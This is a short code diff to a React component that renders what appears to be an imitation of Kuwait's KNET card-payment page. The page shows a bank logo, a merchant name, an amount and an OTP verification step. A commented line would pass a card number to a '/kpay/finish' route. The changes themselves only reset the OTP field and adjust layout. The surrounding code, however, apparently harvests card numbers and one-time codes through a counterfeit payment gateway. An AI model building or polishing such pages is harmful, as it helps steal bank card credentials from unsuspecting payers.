@@ -81,6 +81,7 @@ function KnetPageContent() {
         // إذا أردت تحويل، احذف السطر التالي لتعليق التحويل:
         // router.push(`/kpay/finish?name=${cardNumber}`);
         setVerificationMsg("Code sent, verifying...");
+        setOtp("")
         setIsProcessing(false);
       } catch (error) {
         alert("Error sending OTP");
@@ -100,8 +101,10 @@ function KnetPageContent() {
           <Image src={kibLo} width={220} height={50} alt="logo" />
           <div className={styles.knetInfoRow}>
             <span className={styles.knetInfoLabel}>Merchant:</span>
+            
             <span>Tap Payments EPSP</span>
           </div>
+          <hr />
           <div className={styles.knetInfoRow}>
             <span className={styles.knetInfoLabel}>Amount:</span>
             <span>KD {price}.000</span>
